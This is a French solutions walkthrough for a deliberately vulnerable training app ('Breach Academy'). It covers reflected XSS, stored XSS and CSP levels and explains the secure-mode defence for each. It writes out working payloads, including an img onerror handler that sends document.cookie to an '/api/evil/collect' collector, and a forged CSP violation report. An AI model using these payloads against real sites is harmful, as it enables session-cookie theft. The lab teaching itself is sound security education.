# Solutions — Breach Academy

Solution de chaque niveau, complétée à chaque étape de `docs/PLAN.md`.
Les flags ne figurent pas ici : ils sont dérivés de `FLAG_SECRET` et changent
d'un déploiement à l'autre.

Prérequis commun : serveur lancé avec `BREACH_VULNERABLE_MODE=true` et niveau
basculé en mode **Vulnérable**.

---

## Niveau 1 — XSS réfléchie : « Le moteur de recherche bavard » (étape 2)

**Faille** : le terme cherché est réaffiché via `[innerHTML]` après
`bypassSecurityTrustHtml` (`src/app/levels/search-engine/search-level.ts`).
Une fonction `window.revealFlag()` n'existe qu'en mode vulnérable.

**Solution**
1. Ouvrir `/niveaux/recherche-bavarde`.
2. Rechercher :
   ```html
   <img src=x onerror="revealFlag()">
   ```
   ou ouvrir directement le lien piégé :
   `/niveaux/recherche-bavarde?q=%3Cimg%20src%3Dx%20onerror%3DrevealFlag()%3E`
3. L'image ne se charge pas, `onerror` s'exécute, le flag s'affiche sous la
   recherche. Le copier dans « Soumettre le flag ».

**Pièges**
- `<script>alert(1)</script>` ne marche pas : une balise `script` insérée par
  `innerHTML` n'est jamais exécutée. Il faut un attribut d'événement
  (`onerror`, `onload`, `onfocus`…).
- Raccourci : taper `revealFlag()` dans la console des DevTools fonctionne aussi
  (c'est du JavaScript exécuté dans la page).

**En mode sécurisé** : le payload s'affiche comme du texte (interpolation
`{{ }}`), `revealFlag` n'existe pas, et l'API répond 403.

---

## Niveau 2 — XSS stockée : « Le livre d'or » (étape 3)

**But** : voler le cookie de session du bot administrateur, qui contient le flag.

**En mode vulnérable** :
1. Publier un message contenant un gestionnaire d'événement qui exfiltre le cookie
   du bot vers le collecteur de l'attaquant, par exemple :
   `<img src=x onerror="fetch('/api/evil/collect?c='+document.cookie)">`.
2. Cliquer sur « Lancer la relecture du bot ». Le bot relit le livre d'or
   dans le navigateur du joueur : le serveur lui attribue une session `ba_admin`
   **non HttpOnly** (porteuse du flag), et le message est réinjecté en HTML brut
   (`innerHTML`) — le payload s'exécute dans sa session.
3. Le cookie volé apparaît dans la « console du collecteur » : il contient le flag,
   à recopier dans le formulaire.

- Le collecteur écoute sur `/api/evil/collect` (même origine) : `evil.localhost`
  de la maquette ne résout pas, viser le chemin interne.
- Raccourci : le payload peut aussi lire directement `document.cookie` une fois le
  bot lancé (c'est du JavaScript exécuté dans la vue admin).
- Une balise `<script>` injectée via `innerHTML` ne s'exécute pas : utiliser un
  attribut d'événement (`onerror`, `onload`…).

**En mode sécurisé** : le message est rendu comme du texte (interpolation `{{ }}`),
le serveur refuse tout HTML (400, validation Zod), la session du bot est `HttpOnly`
— l'attaque n'exfiltre rien et le collecteur reste vide.

## Niveau 3 — CSP : « Le mur invisible » (étape 4)

Le livre d'or du niveau 2 (mêmes messages, même bot, toujours vulnérable) est
rejoué sous une CSP posée par un middleware Nitro sur la page du niveau.

1. Garder (ou republier) le message piégé du niveau 2 :
   `<img src=x onerror="fetch('/api/evil/collect?c='+document.cookie)">`.
2. **CSP « Aucune »** : lancer la relecture du bot → le payload s'exécute, le
   collecteur reçoit le cookie.
3. **CSP « Rapport seul »** (`Content-Security-Policy-Report-Only`) : le payload
   s'exécute toujours, mais la console CSP affiche « ⚠ signalée ·
   script-src-attr ← inline » (rapport envoyé au `report-uri`).
4. **CSP « Bloquante »** : le navigateur refuse le gestionnaire `onerror`
   (`script-src 'self'`, sans `'unsafe-inline'`) : rien n'est exfiltré, la
   console affiche « ⛔ bloquée » et **le flag apparaît** dans la console CSP.

Chaque changement de CSP recharge la page : la politique vient de l'en-tête HTTP
du document, elle ne change pas sans nouveau chargement.

Raccourci (et leçon) : un rapport de violation se forge à la main, par exemple
`POST /api/mur-invisible/csp-report?d=enforce` avec un corps
`{"csp-report":{"effective-directive":"script-src-attr","blocked-uri":"inline"}}`.
Les rapports CSP ne prouvent rien : on ne leur fait jamais confiance.

**En mode sécurisé** : la CSP bloquante est imposée et le bot relit les messages
comme du texte ; aucune violation, et le flag n'est jamais révélé (même avec un
rapport forgé).

## Niveau 4 — CSRF : « Le virement fantôme » (étape 5)

_À compléter._

## Niveau 5 — Secrets : « Le coffre qui fuit » (étape 6)

_À compléter._

## Niveau 6 — Injection de prompt : « Le chatbot trop serviable » (étape 7)

_À compléter._
